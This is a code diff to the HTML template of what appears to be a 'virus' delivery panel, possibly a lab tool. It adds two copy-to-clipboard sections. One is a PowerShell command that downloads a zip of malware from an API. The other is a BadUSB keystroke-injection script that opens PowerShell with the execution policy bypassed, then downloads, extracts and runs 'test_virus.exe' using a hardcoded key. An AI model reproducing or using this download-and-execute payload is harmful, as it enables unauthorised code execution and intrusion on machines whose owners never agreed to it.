@@ -38,6 +38,69 @@ Invoke-WebRequest -Uri "{{ data.url }}/api/virusdownload" -Method POST -Headers 
             </pre>
             <button class="btn btn-secondary copy-btn" data-target="ps-command">Copy PowerShell Command</button>
         </div>
+        <!-- PowerShell Command download extract and run -->
+        <h3>PowerShell, extract and run</h3>
+        <button class="btn btn-primary toggle-btn" data-target="ps-command-execute-box">Show PowerShell Command</button>
+        <div id="ps-command-execute-box" style="display: none; margin-top: 10px;">
+            <pre class="code-box">
+    <code id="ps-command">
+Invoke-WebRequest -Uri "{{ data.url }}/api/virusdownload" -Method POST -Headers @{'Content-Type'='application/json'} -Body (@{api_key='{{ data.virus.virus_api }}'} | ConvertTo-Json) -OutFile "file.zip"
+    </code>
+            </pre>
+            <button class="btn btn-secondary copy-btn" data-target="ps-execute-command">Copy PowerShell Command</button>
+        </div>
+        <!-- BadUSB Script, download extract and run -->
+        <h3>BadUSB Script, extract and run</h3>
+        <button class="btn btn-primary toggle-btn" data-target="badusb-command-box">Show BadUSB Script</button>
+        <div id="badusb-command-box" style="display: none; margin-top: 10px;">
+            <pre class="code-box">
+    <code id="badusb-command">
+        DELAY 2000
+        GUI r
+        DELAY 500
+        STRING powershell -NoProfile -ExecutionPolicy Bypass
+        ENTER
+        DELAY 5000
+        STRING $testPath = 'C:\TestVirusPath'
+        ENTER
+        STRING $apiKey = 'superSecretApiKey'
+        ENTER
+        STRING $url = 'http://127.0.0.1:5000/api/virusdownload'
+        ENTER
+        STRING $zipPath = "$testPath\downloaded.zip" 
+        ENTER
+        STRING $extractPath = "$testPath"  
+        ENTER
+        STRING $exePath = "$extractPath\test_virus.exe"  
+        ENTER
+        STRING if (-Not (Test-Path -Path $testPath)) { New-Item -ItemType Directory -Path $testPath -Force }
+        ENTER
+        STRING Invoke-WebRequest -Uri $url -Method POST -Headers @{'Content-Type'='application/json'} -Body (@{api_key=$apiKey} | ConvertTo-Json) -OutFile $zipPath
+        ENTER
+        STRING if (Test-Path $zipPath) {
+        ENTER
+        STRING     Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+        ENTER
+        STRING     if (Test-Path $exePath) {
+        ENTER
+        STRING         Start-Process -FilePath $exePath -Wait
+        ENTER
+        STRING     } else {
+        ENTER
+        STRING         Write-Host "Executable file not found."
+        ENTER
+        STRING     }
+        ENTER
+        STRING } else {
+        ENTER
+        STRING     Write-Host "Download failed or zip file is missing."
+        ENTER
+        STRING }
+        ENTER
+    </code>
+            </pre>
+            <button class="btn btn-secondary copy-btn" data-target="badusb-command">Copy BadUSB Command</button>
+        </div>
     
         <!-- Curl Command -->
         <h3>Curl</h3>
